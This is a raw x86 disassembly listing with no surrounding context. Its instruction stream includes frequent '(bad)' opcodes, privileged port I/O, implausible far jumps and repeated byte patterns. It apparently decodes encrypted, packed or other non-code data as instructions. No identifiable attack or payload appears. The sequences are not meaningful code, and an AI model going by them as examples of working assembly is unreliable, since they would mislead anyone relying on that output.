  423ca4:	jl     0x423c26
  423ca6:	ja     0x423c97
  423ca8:	xor    al,0x2e
  423cab:	or     ch,0x32
  423cae:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423cb4:	xlat   BYTE PTR ds:[ebx]
  423cb5:	push   ebp
  423cb6:	push   ebx
  423cb7:	adc    DWORD PTR [ebx+0x7e],edx
  423cba:	mov    dl,0xbe
  423cbc:	or     al,0xb2
  423cbe:	clc    
  423cbf:	sub    edi,edi
  423cc1:	(bad)  
  423cc2:	xchg   esi,eax
  423cc3:	xor    al,0xf9
  423cc6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423ccd:	mov    dl,0xbe
  423ccf:	or     al,0xb2
  423cd1:	clc    
  423cd2:	sub    edi,edi
  423cd4:	(bad)  
  423cd5:	xchg   esi,eax
  423cd6:	dec    ebp
  423cd7:	xlat   BYTE PTR ds:[ebx]
  423cd8:	jbe    0x423d27
  423cda:	or     bl,BYTE PTR ds:0x50847780
  423ce0:	ja     0x423d58
  423ce2:	xor    BYTE PTR [edi+0x3e],0x50
  423ce6:	ja     0x423c72
  423ce8:	les    edi,FWORD PTR [ecx]
  423cea:	push   ebx
  423ceb:	adc    DWORD PTR [ebx+0x7e],edx
  423cee:	mov    dl,0xbe
  423cf0:	or     al,0xb2
  423cf2:	clc    
  423cf3:	sub    edi,edi
  423cf5:	(bad)  
  423cf6:	xchg   esi,eax
  423cf7:	xor    al,0xf9
  423cfa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423d01:	mov    dl,0xbe
  423d03:	or     al,0xb2
  423d05:	clc    
  423d06:	sub    edi,edi
  423d08:	(bad)  
  423d09:	xchg   esi,eax
  423d0a:	dec    ebp
  423d0b:	xlat   BYTE PTR ds:[ebx]
  423d0c:	test   BYTE PTR [ebp+0xa],cl
  423d0f:	sbb    eax,0x508a7780
  423d14:	ja     0x423d34
  423d16:	xor    BYTE PTR [edi+0x76],0x50
  423d1a:	out    0x56,eax
  423d1c:	push   eax
  423d1d:	ja     0x423d81
  423d1f:	jl     0x423d98
  423d21:	xor    ch,0x24
  423d24:	outs   dx,DWORD PTR ds:[esi]
  423d25:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d2b:	push   esi
  423d2c:	push   ebx
  423d2d:	cld    
  423d2e:	push   ebx
  423d2f:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d35:	or     al,0xff
  423d37:	mov    dl,0x50
  423d39:	ja     0x423d81
  423d3b:	xor    BYTE PTR [edi+0x56],0x80
  423d3f:	lock push esi
  423d41:	push   ebx
  423d42:	cld    
  423d43:	push   ebx
  423d44:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d4a:	or     al,0xff
  423d4c:	mov    dl,0x50
  423d4e:	ja     0x423cff
  423d50:	jl     0x423dc9
  423d52:	jp     0x423d9d
  423d54:	and    al,0x6f
  423d56:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d5a:	fisub  WORD PTR [edi+ebp*2]
  423d5d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d63:	push   esi
  423d64:	push   ebx
  423d65:	cld    
  423d66:	push   ebx
  423d67:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d6d:	sub    edi,edi
  423d6f:	mov    dl,0x80
  423d71:	lock push ds
  423d73:	arpl   bp,di
  423d75:	or     DWORD PTR [edi],ecx
  423d77:	pop    ss
  423d78:	in     al,dx
  423d79:	lea    ecx,[ebp-0x72f35f42]
  423d7f:	lea    eax,[eax+0x77807af0]
  423d85:	jp     0x423d07
  423d87:	xchg   edi,eax
  423d88:	inc    esi
  423d89:	push   ebx
  423d8a:	je     0x423ddf
  423d8c:	push   ecx
  423d8d:	mov    dl,0x86
  423d8f:	or     al,0xb2
  423d91:	mov    edx,0x80fdff29
  423d96:	ja     0x423db6
  423d98:	inc    ebx
  423d99:	sti    
  423d9a:	push   ebx
  423d9b:	jb     0x423de8
  423d9d:	add    eax,0x80af7750
  423da2:	ja     0x423d28
  423da4:	xor    al,0x84
  423da7:	push   ebx
  423da8:	cld    
  423da9:	push   ebx
  423daa:	adc    DWORD PTR [edx-0x7b4df342],esi
  423db0:	sub    edi,edi
  423db2:	mov    dl,0x80
  423db4:	lock scas eax,DWORD PTR es:[edi]
  423db6:	arpl   bp,di
  423db8:	fst    DWORD PTR [edi]
  423dba:	xor    BYTE PTR [edi-0x7c],0x80
  423dbe:	lock test BYTE PTR [ebx-0x4],dl
  423dc2:	push   ebx
  423dc3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dc9:	or     al,0xff
  423dcb:	mov    dl,0x50
  423dcd:	ja     0x423d7e
  423dcf:	xor    BYTE PTR [edi+0x7a],0x80
  423dd3:	lock jp 0x423e29
  423dd6:	cld    
  423dd7:	push   ebx
  423dd8:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dde:	or     al,0xff
  423de0:	mov    dl,0x80
  423de2:	lock scas eax,DWORD PTR es:[edi]
  423de4:	or     DWORD PTR [edx],esp
  423de6:	mov    dl,0x50
  423de8:	ja     0x423d99
  423dea:	xor    BYTE PTR [edi+0x56],0x80
  423dee:	lock push esi
  423df0:	push   ebx
  423df1:	cld    
  423df2:	push   ebx
  423df3:	adc    DWORD PTR [edx-0x7b4df342],esi
  423df9:	sub    edi,edi
  423dfb:	mov    dl,0x80
  423dfd:	lock scas eax,DWORD PTR es:[edi]
  423dff:	arpl   bp,di
  423e01:	or     DWORD PTR [edi],ecx
  423e03:	(bad)  
  423e04:	or     al,0x8d
  423e06:	lea    eax,[eax+0x7750af77]
  423e0c:	scas   eax,DWORD PTR es:[edi]
  423e0d:	xor    BYTE PTR [edi+0x46],0xec
  423e11:	ja     0x423e75
  423e13:	push   eax
  423e14:	out    0x3e,eax
  423e16:	push   eax
  423e17:	ja     0x423e77
  423e19:	pop    esi
  423e1a:	cmc    
  423e1b:	and    al,0x6f
  423e1d:	cmp    BYTE PTR [eax+0x77],dl
  423e20:	push   0x7c
  423e22:	ja     0x423e8a
  423e24:	hlt    
  423e25:	and    al,0x6f
  423e27:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423e2b:	repz and al,0x6f
  423e2e:	cmp    BYTE PTR [eax+0x77],dl
  423e31:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423e3b:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e41:	or     al,0xff
  423e43:	mov    dl,0x50
  423e45:	ja     0x423e44
  423e47:	sub    BYTE PTR [edx-0x42],0x4f
  423e4b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e51:	dec    edi
  423e52:	xor    DWORD PTR [ebp+0x4d],ecx
  423e55:	dec    ebp
  423e56:	jmp    0x7c6a:0x80386f24
  423e5d:	dec    edi
  423e5e:	jge    0x423ead
  423e60:	dec    ebp
  423e61:	dec    ebp
  423e62:	or     esp,DWORD PTR [edi+ebp*2]
  423e65:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e6b:	ja     0x423e64
  423e6d:	xor    al,0xf7
  423e70:	push   ebx
  423e71:	cld    
  423e72:	push   ebx
  423e73:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e79:	or     al,0xff
  423e7b:	mov    dl,0x80
  423e7d:	lock std 
  423e7f:	or     DWORD PTR [edx],esp
  423e81:	mov    dl,0x80
  423e83:	lock pop esi
  423e85:	(bad)  
  423e86:	out    dx,al
  423e87:	out    dx,eax
  423e88:	adc    BYTE PTR [edi-0x54],dh
  423e8b:	sub    BYTE PTR [edx-0x80],0x77
  423e8f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423e99:	or     al,0xb2
  423e9b:	test   BYTE PTR [ecx],ch
  423e9d:	push   DWORD PTR [edx+0x9fdf080]
  423ea3:	and    dh,BYTE PTR [edx-0x7f990f80]
  423ea9:	xchg   edi,eax
  423eaa:	push   bx
  423eac:	push   ecx
  423ead:	push   ebx
  423eae:	xchg   esp,eax
  423eaf:	mov    dl,0xba
  423eb1:	sub    DWORD PTR [edx-0x100f3f9],esi
  423eb7:	in     al,dx
  423eb8:	mov    dl,0x80
  423eba:	lock pop esi
  423ebc:	or     eax,esp
  423ebe:	and    edi,ebp
  423ec0:	or     BYTE PTR [edi+0x31],0x4d
  423ec4:	dec    ebp
  423ec5:	dec    ebp
  423ec6:	sbb    BYTE PTR [eax],0x31
  423ec9:	dec    ebp
  423eca:	dec    ebp
  423ecb:	dec    ebp
  423ecc:	push   ebx
  423ecd:	cld    
  423ece:	push   ebx
  423ecf:	xchg   esp,eax
  423ed0:	mov    dl,0x84
  423ed2:	sub    DWORD PTR [edx-0x400f3f9],esi
  423ed8:	in     al,dx
  423ed9:	mov    dl,0x9
  423edb:	loopne 0x423ecd
  423edd:	lods   al,BYTE PTR ds:[esi]
  423ede:	push   ebx
  423edf:	std    
  423ee0:	adc    al,dh
  423ee2:	lods   al,BYTE PTR ds:[esi]
  423ee3:	sub    BYTE PTR [edx-0x71],0x77
  423ee7:	lods   al,BYTE PTR ds:[esi]
  423ee8:	xor    al,0xf7
  423eeb:	adc    BYTE PTR [edi+0x535153f7],0x94
  423ef2:	mov    dl,0x7
  423ef4:	or     al,0xb2
  423ef6:	mov    edx,0x80feff29
  423efb:	xchg   edi,eax
  423efc:	std    
  423efd:	or     DWORD PTR [edx],esp
  423eff:	inc    BYTE PTR [eax-0x11efa169]
  423f05:	push   cs
  423f06:	sub    BYTE PTR [edx-0x80],0x77
  423f0a:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423f14:	sub    DWORD PTR [edx-0x4d00f342],esi
  423f1a:	xor    al,0xfd
  423f1d:	or     DWORD PTR [edx],esp
  423f1f:	mov    dl,0x80
  423f21:	lock pop esi
  423f23:	(bad)  
  423f24:	out    dx,al
  423f25:	out    dx,eax
  423f26:	adc    BYTE PTR [edi-0x54],dh
  423f29:	sub    BYTE PTR [edx-0x80],0x77
  423f2d:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423f37:	adc    DWORD PTR [edx-0x4d00f342],esi
  423f3d:	xor    al,0xfd
  423f40:	or     DWORD PTR [edx],esp
  423f42:	mov    dl,0x80
  423f44:	lock push 0xffffff80
  423f47:	xchg   edi,eax
  423f48:	push   0x53
  423f4a:	push   ecx
  423f4b:	push   ebx
  423f4c:	xchg   esp,eax
  423f4d:	mov    dl,0xba
  423f4f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f55:	in     al,dx
  423f56:	mov    dl,0x80
  423f58:	lock pop esi
  423f5a:	or     eax,esp
  423f5c:	and    edi,ebp
  423f5e:	or     BYTE PTR [edi+0x7d],0x4d
  423f62:	dec    ebp
  423f63:	dec    ebp
  423f64:	sbb    BYTE PTR [eax],0x7d
  423f67:	dec    ebp
  423f68:	dec    ebp
  423f69:	dec    ebp
  423f6a:	push   ebx
  423f6b:	cld    
  423f6c:	push   ebx
  423f6d:	xchg   esp,eax
  423f6e:	mov    dl,0x84
  423f70:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f76:	in     al,dx
  423f77:	mov    dl,0x9
  423f79:	loopne 0x423f6b
  423f7b:	lods   al,BYTE PTR ds:[esi]
  423f7c:	push   ebx
  423f7d:	std    
  423f7e:	adc    al,dh
  423f80:	lods   al,BYTE PTR ds:[esi]
  423f81:	sub    BYTE PTR [edx-0x71],0x77
  423f85:	lods   al,BYTE PTR ds:[esi]
  423f86:	xor    al,0xf7
  423f89:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f90:	mov    dl,0x7
  423f92:	or     al,0xb2
  423f94:	mov    edx,0x80feff29
  423f99:	xchg   edi,eax
  423f9a:	std    
  423f9b:	or     DWORD PTR [edx],esp
  423f9d:	inc    BYTE PTR [eax-0x11efa169]
  423fa3:	push   cs
  423fa4:	sub    BYTE PTR [edx-0x80],0x77
  423fa8:	es xor al,0x26
  423fac:	push   ebx
  423fad:	adc    DWORD PTR [ebx-0x4],edx
  423fb0:	mov    dl,0xbe
  423fb2:	or     al,0xb2
  423fb4:	test   BYTE PTR [ecx],ch
  423fb6:	push   DWORD PTR [edx-0x7f950f80]
  423fbc:	xchg   edi,eax
  423fbd:	push   0x53
  423fbf:	push   ecx
  423fc0:	push   ebx
  423fc1:	xchg   esp,eax
  423fc2:	mov    dl,0xba
  423fc4:	sub    DWORD PTR [edx-0x100f3f9],esi
  423fca:	or     DWORD PTR [edx],esp
  423fcc:	mov    dl,0xec
  423fce:	ja     0x423fcd
  423fd0:	push   eax
  423fd1:	ja     0x423fd0
  423fd3:	xor    BYTE PTR [edi-0x3],0x80
  423fd7:	lock scas eax,DWORD PTR es:[edi]
  423fd9:	arpl   bp,di
  423fdb:	or     edx,ebp
  423fdd:	(bad)  
  423fde:	or     eax,0x77804d4d
  423fe3:	push   0xffffff80
  423fe5:	lock push 0x53
  423fe8:	adc    DWORD PTR [edx-0x3acf342],esi
  423fee:	mov    dl,0x84
  423ff0:	sub    edi,edi
  423ff2:	mov    dl,0x80
  423ff4:	lock scas eax,DWORD PTR es:[edi]
  423ff6:	or     DWORD PTR [edx],esp
  423ff8:	mov    dl,0x80
  423ffa:	lock ds push ebx
  423ffd:	push   ecx
  423ffe:	mov    dl,0xba
  424000:	sub    edi,edi
  424002:	mov    dl,0x80
  424004:	lock ds push ebx
  424007:	adc    DWORD PTR [edx-0x4d00f342],esi
  42400d:	push   eax
  42400e:	ja     0x424076
  424010:	xor    BYTE PTR [edi-0x7e],0x80
  424014:	lock adc BYTE PTR [ebx+0x11],0xb2
  424019:	mov    esi,0xb2fc530c
  42401e:	test   BYTE PTR [ecx],ch
  424020:	push   DWORD PTR [edx-0x7f7d0f80]
  424026:	xchg   edi,eax
  424027:	adc    BYTE PTR [ebx+0x51],0xb2
  42402b:	mov    edx,0xb2945329
  424030:	pop    es
  424031:	or     al,0xff
  424033:	(bad)  
  424034:	in     al,dx
  424035:	lock data16 in al,dx
  424038:	std    
  424039:	in     al,dx
  42403a:	lock inc esi
  42403c:	push   eax
  42403d:	lock inc esi
  42403f:	les    ebx,FWORD PTR ds:0x80827780
  424045:	lock adc BYTE PTR [ebx-0x4],0x53
  42404a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424050:	or     al,0xff
  424052:	mov    dl,0xec
  424054:	ja     0x42409c
  424056:	push   eax
  424057:	ja     0x42409f
  424059:	xor    BYTE PTR [edi-0x7e],0x80
  42405d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424062:	test   BYTE PTR [ecx],ch
  424064:	push   ebx
  424065:	adc    DWORD PTR [edx-0x4d00f342],esi
  42406b:	xor    al,0x1e
  42406e:	inc    ebx
  42406f:	std    
  424070:	xor    BYTE PTR [edi-0x7e],0x80
  424074:	xchg   edi,eax
  424075:	adc    BYTE PTR [ebx-0x4],0x53
  424079:	xchg   esp,eax
  42407a:	mov    dl,0x7
  42407c:	or     al,0xb2
  42407e:	test   BYTE PTR [ecx],ch
  424080:	(bad)  
  424081:	sti    
  424082:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424089:	mov    dl,0x9
  42408b:	dec    esp
  42408c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  424092:	out    dx,eax
  424093:	dec    ebp
  424094:	xlat   BYTE PTR ds:[ebx]
  424095:	and    DWORD PTR [ecx],eax
  424097:	ja     0x42401f
  424099:	dec    ebp
  42409a:	xlat   BYTE PTR ds:[ebx]
  42409b:	out    dx,eax
  42409c:	or     al,BYTE PTR [eax-0x327f1089]
  4240a2:	jp     0x4240de
  4240a4:	lea    ecx,[ebp+0x7780814d]
  4240aa:	out    dx,eax
  4240ab:	or     ch,0xf7
  4240ae:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4240b4:	xlat   BYTE PTR ds:[ebx]
  4240b5:	mov    cl,BYTE PTR [ebp-0x29]
  4240b8:	jbe    0x424040
  4240ba:	test   eax,0x508d8def
  4240bf:	ja     0x424123
  4240c1:	xor    BYTE PTR [edi-0x75],0x80
  4240c5:	lock mov edx,DWORD PTR [ebx+0x74]
  4240c9:	push   ebx
  4240ca:	push   ecx
  4240cb:	mov    dl,0xba
  4240cd:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4240d3:	xor    al,0x76
  4240d6:	arpl   WORD PTR [edx+0x778057d5],si
  4240dc:	out    dx,eax
  4240dd:	xor    al,0x2e
  4240e0:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4240e7:	lea    ecx,[ebp+0x7e531153]
  4240ed:	mov    dl,0xbe
  4240ef:	or     al,0xb2
  4240f1:	clc    
  4240f2:	sub    edi,edi
  4240f4:	(bad)  
  4240f5:	xchg   esi,eax
  4240f6:	xor    al,0x8b
  4240f9:	adc    BYTE PTR [edi+0x5311538b],0x7e
  424100:	mov    dl,0xbe
  424102:	or     al,0xb2
  424104:	clc    
  424105:	sub    edi,edi
  424107:	(bad)  
  424108:	xchg   esi,eax
  424109:	dec    ebp
  42410a:	xlat   BYTE PTR ds:[ebx]
  42410b:	jbe    0x42415a
  42410d:	or     bl,BYTE PTR ds:0x70a3a9ab
  424113:	sti    
  424114:	out    dx,eax
  424115:	lea    edx,[edi-0x78127880]
  42411b:	and    eax,0x80328099
  424120:	mov    ds:0x8d8d3a2e,al
  424125:	in     eax,dx
  424126:	pop    ebp
  424127:	lea    ecx,[ecx]
  424129:	(bad)  
  42412b:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  424131:	(bad)  
  424133:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  424139:	jne    0x80cfcecc
  42413f:	dec    esp
  424140:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424146:	or     DWORD PTR [edi],ecx
  424148:	mov    esp,0xed8d8d8d
  42414d:	cli    
  42414e:	inc    ecx
  42414f:	lea    ecx,[ebp+0xf09718d]
  424155:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42415b:	push   ebp
  42415c:	or     DWORD PTR [edi],ecx
  42415e:	mov    dh,0x8d
  424160:	lea    ecx,[ebp+0x3a268e80]
  424166:	lea    ecx,[ebp-0x72cd4813]
  42416c:	cmp    dh,0x43
  42416f:	mov    eax,ds:0x5c09fbec
  424174:	or     ah,BYTE PTR [ecx]
  424176:	push   eax
  424177:	lock stc 
  424179:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42417d:	in     al,dx
  42417e:	dec    BYTE PTR [ecx]
  424180:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424187:	adc    eax,0x86f05093
  42418c:	cli    
  42418d:	dec    ebp
  42418e:	dec    ebp
  42418f:	dec    ebp
  424190:	jmp    0x42412d
  424192:	dec    edi
  424193:	outs   dx,BYTE PTR ds:[esi]
  424194:	aad    0xeb
  424196:	or     BYTE PTR [esi],0xed
  424199:	mov    bh,0xc8
  42419b:	lea    esi,[ebx]
  42419d:	jle    0x42418b
  42419f:	test   DWORD PTR [ecx],0x9a1e65c
  4241a5:	pop    esp
  4241a6:	scas   al,BYTE PTR es:[edi]
  4241a7:	and    esp,ebp
  4241a9:	push   es
  4241aa:	aad    0xbf
  4241ac:	add    edx,ebx
  4241ae:	adc    eax,0x4f87f050
  4241b3:	outs   dx,BYTE PTR ds:[esi]
  4241b4:	aad    0x92
  4241b6:	xor    BYTE PTR [eax],0xed
  4241b9:	mov    bh,0x8b
  4241bb:	lea    esi,[ebx]
  4241bd:	push   ecx
  4241be:	in     al,dx
  4241bf:	std    
  4241c0:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  4241c4:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  4241c8:	in     al,dx
  4241c9:	push   es
  4241ca:	aad    0x43
  4241cc:	add    edi,ebx
  4241ce:	adc    eax,0x808ae750
  4241d3:	out    0x8a,eax
  4241d5:	sub    BYTE PTR [ebx+0x4f],0x4d
  4241d9:	aad    0x6f
  4241db:	and    BYTE PTR [edi-0x73dac507],0x9
  4241e2:	pop    esp
  4241e3:	fbld   TBYTE PTR [ecx+0x219f5c09]
  4241e9:	dec    ebp
  4241ea:	ja     0x424177
  4241ec:	in     eax,dx
  4241ed:	ja     0x424179
  4241ef:	out    dx,eax
  4241f0:	in     al,dx
  4241f1:	push   es
  4241f2:	pop    edi
  4241f3:	out    0x8b,eax
  4241f5:	in     al,0xa4
  4241f7:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  4241fb:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  4241ff:	xor    al,0x87
  424202:	dec    ebp
  424203:	ja     0x4241cd
  424205:	in     eax,dx
  424206:	mov    dl,0xef
  424208:	in     al,dx
  424209:	push   es
  42420a:	push   eax
  42420b:	lock xchg DWORD PTR [edi-0x19],ebx
  42420f:	enter  0x2ee4,0x80
  424213:	lock xchg BYTE PTR [ecx],cl
  424216:	pop    esp
  424217:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  42421d:	dec    ebp
  42421e:	ja     0x424252
  424220:	in     eax,dx
  424221:	mov    dl,0xef
  424223:	in     al,dx
  424224:	pushf  
  424225:	push   eax
  424226:	lock xchg BYTE PTR [edi-0x69],bl
  42422a:	xor    cl,BYTE PTR [ecx]
  42422c:	jmp    0xa3ab:0x4d4d4d9a
  424233:	push   ebx
  424234:	push   0x6d
  424236:	les    ecx,FWORD PTR [ebx+edx*2]
  424239:	push   0xffffffa9
  42423b:	jo     0x4242b1
  42423d:	xchg   edi,eax
  42423e:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424245:	lea    eax,[eax-0x7812de89]
  42424b:	jno    0x4241e0
  42424d:	push   ebx
  42424e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42424f:	cdq    
  424250:	fwait
  424251:	pop    edi
  424252:	pop    ds
  424253:	or     DWORD PTR [edi],ecx
  424255:	jmp    0xd574:0x638d8d8d
  42425c:	call   0xd81fdfc0
  424261:	das    
  424262:	push   ebx
  424263:	push   0x6d
  424265:	(bad)  
  424266:	fld    DWORD PTR [eax+0x77ecdd6d]
  42426c:	out    dx,eax
  42426d:	cmp    BYTE PTR [ebp+0x25],0x80
  424271:	or     dh,BYTE PTR ds:0x80155280
  424277:	fstp   QWORD PTR ds:0xeceff0ec
  42427d:	xchg   edi,eax
  42427e:	out    dx,eax
  42427f:	push   eax
  424280:	xlat   BYTE PTR ds:[ebx]
  424281:	mov    ah,BYTE PTR [ebx+0x4b]
  424284:	fucomi st,st(4)
  424286:	push   eax
  424287:	out    0x8a,eax
  424289:	push   eax
  42428a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42428b:	mov    ebx,DWORD PTR [edi-0x59]
  42428e:	mov    bl,cl
  424290:	mov    dh,0x63
  424292:	popf   
  424293:	adc    eax,0x5c096fd3
  424298:	push   ebp
  424299:	scas   al,BYTE PTR es:[edi]
  42429a:	les    ecx,FWORD PTR [eax+eax*4]
  42429d:	mov    BYTE PTR [ecx],0x55
  4242a0:	mov    es,WORD PTR [eax-0x2ab2b097]
  4242a6:	aas    
  4242a7:	in     al,dx
  4242a8:	out    0xef,eax
  4242aa:	push   eax
  4242ab:	out    0x32,eax
  4242ad:	arpl   WORD PTR [ebx-0x587f8e27],cx
  4242b3:	and    DWORD PTR [eax-0x7d131a5d],eax
  4242b9:	arpl   WORD PTR [esi],ax
  4242bb:	shr    esi,cl
  4242bd:	sbb    BYTE PTR [ecx-0x3c],0xef
  4242c1:	inc    ebx
  4242c2:	out    0xef,eax
  4242c4:	push   eax
  4242c5:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  4242cf:	mov    esi,DWORD PTR [ebx+0x50]
  4242d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d3:	mov    esp,DWORD PTR [ebx-0x59]
  4242d6:	mov    ah,ah
  4242d8:	pop    esi
  4242d9:	(bad)  
  4242da:	into   
  4242db:	push   ebx
  4242dc:	push   0xffffffab
  4242de:	test   eax,0xeffb70a3
  4242e3:	lea    edx,[edi-0x78127880]
  4242e9:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  4242f3:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  4242f7:	cmc    
  4242f8:	and    al,0x6f
  4242fa:	cmp    BYTE PTR [eax-0x587f7510],al
  424300:	mov    bl,BYTE PTR [ebx+0x52010de2]
  424306:	cmp    dl,BYTE PTR [ebx+0x51]
  424309:	mov    dl,0xbe
  42430b:	or     al,0xab
  42430d:	push   ebx
  42430e:	lods   al,BYTE PTR ds:[esi]
  42430f:	mov    dl,0xb4
  424311:	sub    edi,edi
  424313:	adc    DWORD PTR [eax-0x10],edx
  424316:	xchg   BYTE PTR [eax-0xf7f7510],al
  42431c:	mov    al,BYTE PTR [eax-0xf7f7510]
  424322:	mov    al,BYTE PTR [eax-0xf7f7510]
  424328:	mov    al,BYTE PTR [eax-0xf7f7510]
  42432e:	mov    al,BYTE PTR [eax-0xf7f7510]
  424334:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  424338:	fsincos 
  42433a:	lods   al,BYTE PTR ds:[esi]
  42433b:	pop    eax
  42433c:	xor    al,0x8a
  42433f:	and    BYTE PTR [edi+0x53ac538a],0x51
  424346:	mov    dl,0xb4
  424348:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42434e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424355:	lea    ecx,[ebp+0xf09ff63]
  42435b:	sbb    ah,ch
  42435d:	lea    ecx,[ebp-0x7f750f80]
  424363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424364:	mov    dl,BYTE PTR [ebx+0x51]
  424367:	push   ebx
  424368:	lods   al,BYTE PTR ds:[esi]
  424369:	mov    dl,0xbe
  42436b:	or     al,0xb2
  42436d:	mov    ah,0x29
  42436f:	call   DWORD PTR [ecx]
  424371:	arpl   si,di
  424373:	or     DWORD PTR [edi],ecx
  424375:	jecxz  0x424363
  424377:	lea    ecx,[ebp-0x72327080]
  42437d:	lea    ecx,[ebp-0x7f756880]
  424383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424384:	mov    dl,BYTE PTR [ebx+0x7e]
  424387:	push   ebx
  424388:	lods   al,BYTE PTR ds:[esi]
  424389:	mov    dl,0x7
  42438b:	or     al,0xb2
  42438d:	mov    ah,0x29
  42438f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  424396:	in     al,dx
  424397:	lea    ecx,[ebp+0x50eff0ec]
  42439d:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  4243a8:	pop    es
  4243a9:	or     al,0xb2
  4243ab:	mov    ah,0x29
  4243ad:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  4243b4:	xor    ah,BYTE PTR [ebx-0x9]
  4243b7:	aad    0x27
  4243b9:	xor    BYTE PTR [edi-0x76],0x80
  4243bd:	xchg   edi,eax
  4243be:	mov    dl,BYTE PTR [ebx-0x64]
  4243c1:	push   ebx
  4243c2:	cld    
  4243c3:	mov    dl,0xf8
  4243c5:	sub    DWORD PTR [edx-0x400f37a],esi
  4243cb:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243d2:	out    dx,al
  4243d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243d4:	xlat   BYTE PTR ds:[ebx]
  4243d5:	rol    BYTE PTR [eax-0x687f7589],0x8a
  4243dc:	push   ebx
  4243dd:	pushf  
  4243de:	push   ebx
  4243df:	cld    
  4243e0:	mov    dl,0xf8
  4243e2:	sub    DWORD PTR [edx-0x400f37a],esi
  4243e8:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243ef:	jne    0x424397
  4243f1:	jno    0x4243fc
  4243f3:	push   gs
  4243f5:	or     al,0x8d
  4243f7:	lea    eax,[eax+0x77808a77]
  4243fd:	mov    al,BYTE PTR [eax+0x77808aa7]
  424403:	mov    dl,BYTE PTR [ebx+0x7c]
  424406:	push   ebx
  424407:	add    al,0xb2
  424409:	test   BYTE PTR [ecx],ch
  42440b:	mov    dl,0xc4
  42440d:	or     al,0xff
  42440f:	add    BYTE PTR [eax+0x6ac33277],0x15
  424416:	in     al,dx
  424417:	mov    dl,0x80
  424419:	jge    0x42448c
  42441b:	in     al,dx
  42441c:	lock out dx,eax
  42441e:	push   eax
  42441f:	lock test BYTE PTR [eax-0x687f7510],al
  424426:	mov    dl,BYTE PTR [ebx+0x51]
  424429:	push   ebx
  42442a:	pushf  
  42442b:	mov    dl,0xbe
  42442d:	or     al,0xb2
  42442f:	clc    
  424430:	sub    edi,edi
  424432:	inc    BYTE PTR [eax-0xfaf7569]
  424438:	jp     0x4243ba
  42443a:	out    dx,eax
  42443b:	push   eax
  42443c:	lock stc 
  42443e:	xor    al,0x8a
  424441:	push   ebx
  424442:	jle    0x424497
  424444:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42444a:	or     al,0xff
  42444c:	mov    dh,0x80
  42444e:	lock stc 
  424450:	arpl   si,di
  424452:	aad    0x6f
  424454:	in     al,dx
  424455:	lock out dx,eax
  424457:	push   eax
  424458:	lock jp 0x4243db
  42445b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424462:	push   ebx
  424463:	pushf  
  424464:	mov    dl,0xbe
  424466:	or     al,0xb2
  424468:	clc    
  424469:	sub    edi,edi
  42446b:	(bad)  
  42446c:	in     al,dx
  42446d:	jge    0x424490
  42446f:	jl     0x4244e8
  424471:	xor    cl,0x24
  424474:	outs   dx,DWORD PTR ds:[esi]
  424475:	cmp    ah,ch
  424477:	lock out dx,eax
  424479:	push   eax
  42447a:	lock xchg esp,eax
  42447d:	in     al,dx
  42447e:	xor    al,0x87
  424481:	xor    BYTE PTR [edi+0x21],0x80
  424485:	int    0x32
  424487:	cmp    cl,BYTE PTR [ebp+0x714d968d]
